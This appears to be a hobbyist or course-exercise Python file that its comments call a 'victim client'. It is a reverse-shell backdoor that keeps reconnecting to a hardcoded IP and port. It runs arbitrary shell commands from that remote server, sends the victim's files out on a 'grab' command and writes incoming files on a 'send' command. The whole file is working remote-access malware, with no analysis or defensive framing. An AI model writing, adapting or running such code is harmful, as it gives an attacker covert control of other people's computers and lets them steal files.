# victim client
# Works on TCP
# Keeps tuning to establish the connection with Server
# Change directory (executed 'cd' shell command)
# TCP bi-directional data transfer (Infiltration and exfiltation)-CLIENT

import socket
import subprocess
import os
import time

ip = "172.25.191.60"
port = 8080

def initiate():
    tuneConnection()

def tuneConnection():
    # Trying to connect to server every 20 seconds
    while True:
        try:
            mySocket = socket.socket()
            mySocket.connect((ip, port))
            shell(mySocket)
        except:
            mySocket.close()
            pass 
        time.sleep(20)

def letGrab(mySocket, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            mySocket.send(packet)
            packet = f.read(5000)
        mySocket.send('DONE'.encode())
        f.close  # not in instructions
    else:
        mySocket.send('File not found'.encode())

def letSend(mySocket, path, fileName):
    if os.path.exists(path):
        f = open(path + fileName, 'ab')
        while True:
            bits = mySocket.recv(5000)
            if bits.endswith('DONE'.encode()):
                # Write those last received bits without the word 'DONE' - 4 characters
                f.write(bits[:-4])
                f.close()
                break
            if 'File not found'.encode() in bits:
                f.close()  # not in directions
                break
            f.write(bits)

def shell(mySocket):
    while True:
        command = mySocket.recv(5000)

        if 'terminate' in command.decode():
            try:
                mySocket.close()
                break
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())
                break

        # command format: grab*,file Path>
        # example: grab*C:\Users\John\Desktop\photo.jpeg
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                letGrab(mySocket, path)
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())

        #command format: send*<destination path>*<File Name>
        # example: send*C:\Users\John\Desktop\*photo.jpeg 
        elif 'send' in command.decode():
            send, path, fileName = command.decode().split("*")
            try:
                letSend(mySocket, path, fileName)
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())


        #command format: "cd<space><Path name>"
        #split using the space between 'cd' and path name
        #(because, path name also may have spaces, that confuses the script)
        #and explicitly tell the operating system to change the directory
        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ", 1)
                os.chdir(directory)
                informToServer = "[+] Current working directory is " + os.getcwd()
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin = subprocess.PIPE,
                                  stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            mySocket.send(CMD.stderr.read())
            mySocket.send(CMD.stdout.read())

def main():
    initiate()

main()
